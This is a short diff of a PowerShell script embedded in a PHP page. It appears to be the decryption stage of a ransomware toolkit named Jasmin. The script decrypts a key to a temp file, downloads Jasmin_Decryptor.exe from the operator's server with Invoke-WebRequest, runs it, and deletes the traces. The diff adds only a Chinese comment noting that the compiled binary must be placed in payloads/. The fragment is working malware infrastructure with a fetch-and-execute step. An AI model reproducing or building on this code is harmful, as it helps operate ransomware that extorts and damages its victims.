@@ -266,6 +266,7 @@ $cs=New-Object Security.Cryptography.CryptoStream($ms,$dec,"Read")
 $sr=New-Object IO.StreamReader($cs)
 [IO.File]::WriteAllText("$tmp\key.pem",$sr.ReadToEnd())
 $sr.Close();$cs.Close();$ms.Close()
+# 注: 需先将 Jasmin_Decryptor.exe 放入 payloads/ (仓库未附编译产物)
 Invoke-WebRequest "<?=$server_url?>/payloads/Jasmin_Decryptor.exe" -OutFile "$tmp\dec.exe"
 & "$tmp\dec.exe" "$tmp\key.pem"
 Remove-Item -Recurse -Force $tmp</pre>
